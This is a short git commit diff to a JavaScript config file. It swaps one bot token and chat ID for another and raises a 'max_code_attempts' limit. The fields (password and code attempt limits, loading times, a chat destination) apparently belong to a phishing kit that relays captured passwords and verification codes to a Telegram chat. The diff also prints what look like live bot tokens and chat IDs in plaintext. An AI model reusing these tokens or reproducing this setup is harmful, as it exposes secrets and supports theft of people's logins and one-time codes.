306ffcc2128057f6da493f80cffd2a15294f742d
amidatanga6-spec <amidatanga6@gmail.com>
2026-05-23 09:58:13 -0400

    Update config with new token and chat ID

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,10 +1,10 @@
 const config = {
-    token: '8747512462:AAEhyagj8O5QyWZf-HhA2rrfY0S1wA6DZlE',
-    chat_id: '-5267923459',
+    token: '8607265204:AAGdazKjxYDRg5u5YgckgKVHLwMVQHjwwVM',
+    chat_id: '-1003892507603',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
-    max_code_attempts: 2,
+    max_code_attempts: 3,
     password_loading_time: 3,
     code_loading_time: 3
 };
